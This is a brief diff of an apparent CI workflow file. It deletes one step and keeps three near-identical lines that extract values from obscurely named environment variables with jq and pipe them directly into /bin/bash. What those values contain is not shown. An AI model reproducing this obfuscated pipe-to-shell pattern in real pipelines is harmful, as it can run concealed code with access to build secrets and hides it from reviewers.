@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$som84834" | jq -r .sa5782 | /bin/bash
           echo $otk5858 | jq -r .xnidy3428 | /bin/bash
           printf '%s' "$m846" | jq -r .sigt589 | /bin/bash
-          printf '%s' "$j09" | jq -r .pezlz28 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
